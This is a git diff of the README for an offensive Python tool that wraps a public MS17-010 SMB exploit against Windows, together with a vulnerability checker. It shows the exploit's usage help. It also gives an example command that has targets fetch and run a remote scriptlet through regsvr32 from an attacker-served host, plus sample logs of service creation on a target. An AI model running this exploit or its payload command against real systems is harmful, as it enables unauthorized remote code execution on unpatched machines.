@@ -1,4 +1,6 @@
-# MS17-010: Python
+MS17-010: Python
+=================
+
 All credit goes to Worawit: 
 
 [Worawit Wang: GitHub](https://github.com/worawit/MS17-010/)
@@ -11,12 +13,13 @@ Korey McKinley wrote an [article](https://lmgsecurity.com/manually-exploiting-ms
 
 However, the module Korey used in that blog article was not available in my version of Metasploit. It is now called **web_delivery**. 
 
-The zzz_exploit.py found in this repo is the same exploit logic. But it has been made more dynamic. It is now possible to pass user and password with the -u and -p, respectively. A command to write to a service is passed with the -c option and the target and pipe are -t and -p. 
+There are two pieces, `zzz_checker.py` and `zzz_exploit.py`. Both self-explanatory.
 
-Logger.py is just a script I've been reusing with all my code to prettify output. If deleted, zzz will break :)
-ip_parser.py is just a script for parsing different IP/network formats. (192.168.0.0/24, 192.168.0.0-150, etc)
+***
 
-Here is the full help page output:
+Exploit Usage
+=============
+
 ```
 ➜  MS17-010 git:(master) ✗ ./zzz_exploit.py --help                                                                                        
 usage: zzz_exploit.py [-h] [-u] [-p] -t  [-c] [-P] [--version]
@@ -49,7 +52,9 @@ optional arguments:
 Example: python zzz_exploit -t 192.168.0.1-100 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
 
-Sample output:
+Sample output
+=============
+
 ```
 > # python zzz_exploit.py -t 10.10.11.53                                                                                                                                                     
 [08:50:24]  [INFO]:     TARGET: 10.10.11.53
@@ -92,12 +97,11 @@ Sample output:
 [08:50:29]  [ACTION]:   REMOVING SERVICE PKfJ...
 [08:50:29]  [SUCCESS]:  FINISHED!
 ```
-I wrote an article using Korey's payload and the new changes to the script, please see it [here](https://mez0.cc/posts/weaponised-worawit.html)
 
+***
 
-I made similar changes to checker.py, but the only additional logic I added was to be able to effectively run this script across a subnet. I imported the **netaddr** module and wrote a short for loop to run across the subnet.
-
-Here is the help page for checker.py:
+Checker Usage
+=============
 
 ```
 usage: checker.py [-h] [-u] [-p] [-t] [-tf] [--version]
@@ -114,7 +118,10 @@ optional arguments:
 
 Example: python checker.py -t 192.168.0.1-100
 ```
-Sample output:
+
+Sample output
+=============
+
 ```
 > # python checker.py -t 10.10.11.53                                                                                                                                                         
 [08:37:25]  [INFO]: 	CONNECTED TO 10.10.11.53
@@ -127,5 +134,3 @@ Sample output:
 [08:37:26]  [SUCCESS]: 	lsarpc: OK (64 bit)
 [08:37:26]  [ERROR]: 	browser: STATUS_OBJECT_NAME_NOT_FOUND
 ```
-
-Any further ideas, changes or fixes; please let me know!
